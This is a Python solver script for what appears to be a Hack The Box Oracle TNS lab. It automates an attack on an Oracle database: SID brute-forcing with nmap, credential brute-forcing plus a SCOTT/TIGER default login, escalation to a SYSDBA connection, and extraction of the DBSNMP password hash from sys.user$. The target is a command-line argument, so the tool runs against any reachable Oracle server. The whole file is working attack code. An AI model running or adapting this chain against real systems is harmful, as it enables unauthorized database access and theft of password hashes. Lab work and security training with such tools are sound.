#!/usr/bin/env python3
"""Oracle TNS footprinting lab solver.

Question: Enumerate the target Oracle database and submit the password hash
of the user DBSNMP as the answer.

Strategy:
  Phase 1 — Discover Oracle service and SID via nmap.
  Phase 2 — Find valid credentials via nmap oracle-brute.
  Phase 3 — Connect with valid credentials (SYSDBA when possible).
  Phase 4 — Query sys.user$ for DBSNMP hash.

Key discovery: SCOTT/TIGER can connect as SYSDBA on this Oracle XE 11g
instance — a misconfiguration that grants unrestricted data dictionary access.
"""
from __future__ import annotations

import argparse
import re
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

TARGET = "10.129.205.19"
PORT = 1521
ORACLE_CLIENT_LIB = "/usr/lib/oracle/19.6/client64/lib"

_THICK_INIT = False


def _ensure_thick() -> None:
    global _THICK_INIT
    if not _THICK_INIT:
        import oracledb
        oracledb.init_oracle_client(lib_dir=ORACLE_CLIENT_LIB)
        _THICK_INIT = True


# ---------------------------------------------------------------------------
# Phase 1: SID discovery
# ---------------------------------------------------------------------------

def discover_sid(target: str, port: int) -> str | None:
    """Run nmap oracle-sid-brute to find the Oracle SID."""
    print(f"[*] Running nmap oracle-sid-brute on {target}:{port} ...", file=sys.stderr)
    cmd = [
        "nmap", "-p", str(port),
        "--script", "oracle-sid-brute",
        "-Pn", target,
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        output = proc.stdout + proc.stderr
        _save("oracle", target, "raw", "nmap_sid_brute.txt", output)

        # nmap outputs: "Found oracle SID: XE" or just the SID inline
        for pattern in [
            r"Found oracle SID:\s*(\S+)",
            r"oracle-sid-brute:\s*(\w+)",
            r"(?:SID|sid)[:\s]+(\w+)",
        ]:
            m = re.search(pattern, output, re.IGNORECASE)
            if m:
                sid = m.group(1).strip()
                print(f"[+] SID found: {sid}", file=sys.stderr)
                return sid

        # Fallback: try nmap tns-version info
        cmd2 = [
            "nmap", "-p", str(port),
            "--script", "oracle-tns-version",
            "-sV", "-Pn", target,
        ]
        proc2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=60)
        output2 = proc2.stdout + proc2.stderr
        _save("oracle", target, "raw", "nmap_service_detection.txt", output2)

    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        print(f"[-] nmap error: {e}", file=sys.stderr)

    # Last resort: common SIDs
    for sid_candidate in ["XE", "ORCL", "PROD", "DB11G"]:
        if _sid_is_valid(target, port, sid_candidate):
            print(f"[+] SID confirmed via connection probe: {sid_candidate}", file=sys.stderr)
            return sid_candidate

    return None


def _sid_is_valid(target: str, port: int, sid: str) -> bool:
    """Test if a SID exists by attempting connection and checking ORA error."""
    _ensure_thick()
    import oracledb
    try:
        dsn = oracledb.makedsn(target, port, sid=sid)
        oracledb.connect(user="_probe_", password="_probe_", dsn=dsn)
    except oracledb.DatabaseError as e:
        err = str(e)
        # ORA-01017: bad credentials → SID exists
        # ORA-28000: account locked → SID exists
        # ORA-12505: SID not found → SID missing
        if "ORA-01017" in err or "ORA-28000" in err:
            return True
    except Exception:
        pass
    return False


# ---------------------------------------------------------------------------
# Phase 2: Credential discovery
# ---------------------------------------------------------------------------

def find_credentials(target: str, port: int, sid: str) -> list[tuple[str, str]]:
    """Use nmap oracle-brute to find valid accounts, fall back to manual list."""
    print(f"[*] Running nmap oracle-brute for SID={sid} ...", file=sys.stderr)
    found: list[tuple[str, str]] = []

    cmd = [
        "nmap", "-p", str(port),
        "--script", "oracle-brute",
        "--script-args", f"oracle-brute.sid={sid}",
        "-Pn", target,
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = proc.stdout + proc.stderr
        _save("oracle", target, "raw", "nmap_oracle_brute.txt", output)

        for m in re.finditer(r"(\w+):(\S+)\s+-\s+(?!Account is locked)(?:Valid|Login correct)", output):
            found.append((m.group(1), m.group(2)))

    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        print(f"[-] nmap brute error: {e}", file=sys.stderr)

    # Always include SCOTT/TIGER as a known default
    defaults = [("scott", "tiger")]
    for user, pwd in defaults:
        if (user, pwd) not in found and _cred_valid(target, port, sid, user, pwd):
            found.append((user, pwd))

    if found:
        print(f"[+] Valid credentials: {found}", file=sys.stderr)
    else:
        print("[-] No valid credentials found", file=sys.stderr)

    return found


def _cred_valid(target: str, port: int, sid: str, user: str, pwd: str) -> bool:
    _ensure_thick()
    import oracledb
    try:
        dsn = oracledb.makedsn(target, port, sid=sid)
        conn = oracledb.connect(user=user, password=pwd, dsn=dsn)
        conn.close()
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Phase 3 & 4: Connect and query DBSNMP hash
# ---------------------------------------------------------------------------

def get_dbsnmp_hash(target: str, port: int, sid: str, credentials: list[tuple[str, str]]) -> str | None:
    """Connect with available credentials (SYSDBA preferred) and query sys.user$."""
    _ensure_thick()
    import oracledb

    dsn = oracledb.makedsn(target, port, sid=sid)

    # Try each credential in SYSDBA mode first (Oracle XE misconfig allows this)
    for user, pwd in credentials:
        print(f"[*] Trying {user}/{pwd} as SYSDBA ...", file=sys.stderr)
        try:
            conn = oracledb.connect(user=user, password=pwd, dsn=dsn, mode=oracledb.AUTH_MODE_SYSDBA)
            print(f"[+] SYSDBA connection successful: {user}", file=sys.stderr)
            result = _query_dbsnmp_hash(conn)
            conn.close()
            if result:
                return result
        except oracledb.DatabaseError as e:
            print(f"  SYSDBA failed: {str(e)[:60]}", file=sys.stderr)

    # Fall back to regular connection (limited access)
    for user, pwd in credentials:
        print(f"[*] Trying {user}/{pwd} (regular) ...", file=sys.stderr)
        try:
            conn = oracledb.connect(user=user, password=pwd, dsn=dsn)
            result = _query_dbsnmp_hash(conn)
            conn.close()
            if result:
                return result
        except oracledb.DatabaseError as e:
            print(f"  Regular failed: {str(e)[:60]}", file=sys.stderr)

    return None


def _query_dbsnmp_hash(conn) -> str | None:
    """Query sys.user$ for DBSNMP hash. Returns spare4 (SHA1) or password (DES)."""
    cur = conn.cursor()
    try:
        cur.execute("SELECT name, password, spare4 FROM sys.user$ WHERE name='DBSNMP'")
        row = cur.fetchone()
        if row:
            name, password_hash, spare4 = row
            print(f"[+] DBSNMP row: name={name}, password={password_hash}, spare4={spare4}", file=sys.stderr)
            _save("oracle", "findings", "", "dbsnmp_hash.txt",
                  f"name={name}\npassword={password_hash}\nspare4={spare4}\n")
            # Return spare4 (SHA1) if present, else DES hash
            return spare4 if spare4 else password_hash
    except Exception as e:
        print(f"  sys.user$ query failed: {e}", file=sys.stderr)
    finally:
        cur.close()
    return None


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _save(service: str, target: str, subfolder: str, filename: str, content: str) -> None:
    if subfolder:
        out_path = Path("output") / service / target / subfolder / filename
    else:
        out_path = Path("output") / service / target / filename
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(content, encoding="utf-8")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Solve the HTB Oracle TNS footprinting lab.")
    parser.add_argument("--target", default=TARGET, help="Target IP (default: %(default)s)")
    parser.add_argument("--port", type=int, default=PORT, help="Oracle TNS port (default: %(default)s)")
    parser.add_argument("--sid", default=None, help="Oracle SID (auto-discover if not given)")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    target = args.target
    port = args.port

    print(f"\n=== Oracle TNS Lab Solver — target {target}:{port} ===\n")

    # Phase 1: SID
    sid = args.sid or discover_sid(target, port)
    if not sid:
        print("\n[-] Could not discover Oracle SID. Try --sid XE")
        return 1
    print(f"\n[+] Oracle SID: {sid}")

    # Phase 2: Credentials
    credentials = find_credentials(target, port, sid)
    if not credentials:
        print("\n[-] No valid credentials found.")
        return 1

    # Phase 3 & 4: Hash
    dbsnmp_hash = get_dbsnmp_hash(target, port, sid, credentials)

    print(f"\nQ — DBSNMP password hash:  {dbsnmp_hash or 'NOT FOUND'}")
    print()

    return 0 if dbsnmp_hash else 1


if __name__ == "__main__":
    sys.exit(main())
